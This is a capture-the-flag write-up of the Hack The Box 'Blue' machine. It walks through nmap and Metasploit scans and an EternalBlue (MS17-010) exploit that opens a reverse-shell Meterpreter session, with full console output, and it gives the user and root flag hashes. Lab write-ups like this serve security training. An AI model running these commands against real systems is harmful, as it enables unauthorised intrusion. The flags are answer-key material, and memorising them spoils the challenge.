# Hack The Box | [Blue](https://app.hackthebox.eu/machines/51)
###### Writeup by. Jessi

## Enumeration
### Nmap Scan
Begin by running an nmap scan on the target.  
**Target:** 10.129.79.43  
~~~Bash
┌──(jessi㉿teatimesec)-[~/HTB/Blue]
└─$ nmap -T4 -F 10.129.79.43
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-09 08:01 EST
Nmap scan report for 10.129.79.43
Host is up (0.025s latency).
Not shown: 91 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
~~~
### Open Ports/Services
445/tcp - SMB  
### SMB
I can use the auxililary/scanner/smb/smb_version in msfconsole to scan the target for the SMB version.
~~~Bash
msf6 > use auxiliary/scanner/smb/smb_version 
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 10.129.79.43
RHOSTS => 10.129.79.43
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 10.129.79.43:445      - SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:7m 14s) (guid:{066371f8-2a43-4be7-8ab5-4e0a8e02a457}) (authentication domain:HARIS-PC)
[+] 10.129.79.43:445      -   Host is running Windows 7 Professional SP1 (build:7601) (name:HARIS-PC)
[*] 10.129.79.43:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
~~~
Afterwards, I can use auxiliary/scanner/smb/smb_ms17_010 to see if my target is vulnerable to MS17-010, very likely it is.  
~~~Bash
msf6 auxiliary(scanner/smb/smb_version) > use auxiliary/scanner/smb/smb_ms17_010 
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.129.79.43
RHOSTS => 10.129.79.43
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.129.79.43:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.129.79.43:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
~~~
Good output, from here exploitation should be straightforward.  
## Exploitation
### EternalBlue
I can use msfconsole to execute ms17_010_eternalblue right away.  
~~~Bash
msf6 auxiliary(scanner/smb/smb_ms17_010) > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.129.79.43
RHOSTS => 10.129.79.43
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0
LHOST => tun0
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.43:4444 
[*] 10.129.79.43:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.79.43:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.129.79.43:445      - Scanned 1 of 1 hosts (100% complete)
[*] 10.129.79.43:445 - Connecting to target for exploitation.
[+] 10.129.79.43:445 - Connection established for exploitation.
[+] 10.129.79.43:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.129.79.43:445 - CORE raw buffer dump (42 bytes)
[*] 10.129.79.43:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.129.79.43:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.129.79.43:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.129.79.43:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.129.79.43:445 - Trying exploit with 12 Groom Allocations.
[*] 10.129.79.43:445 - Sending all but last fragment of exploit packet
[*] 10.129.79.43:445 - Starting non-paged pool grooming
[+] 10.129.79.43:445 - Sending SMBv2 buffers
[+] 10.129.79.43:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.129.79.43:445 - Sending final SMBv2 buffers.
[*] 10.129.79.43:445 - Sending last fragment of exploit packet!
[*] 10.129.79.43:445 - Receiving response from exploit packet
[+] 10.129.79.43:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.129.79.43:445 - Sending egg to corrupted connection.
[*] 10.129.79.43:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 10.129.79.43
[*] Meterpreter session 1 opened (10.10.14.43:4444 -> 10.129.79.43:49158) at 2021-01-09 08:10:50 -0500
[+] 10.129.79.43:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.79.43:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.79.43:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > 
~~~
Success. From here I can use the meterpreter shell to catpure the user.txt and root.txt flags.  
##### user.txt
Located in C:\Users\haris\Desktop  
**4c546aea7dbee75cbd71de245c8deea9**
##### root.txt
Located in C:\Users\Administrator\Desktop
**ff548eb71e920ff6c08843ce9df4e717**
